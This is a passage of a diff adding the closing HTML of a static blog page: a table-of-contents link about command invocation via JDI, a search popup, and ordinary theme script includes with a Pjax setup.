href="#6-%E5%9F%BA%E4%BA%8EJDI%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E8%B0%83%E7%94%A8"><span class="nav-text">6.基于JDI实现命令调用</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
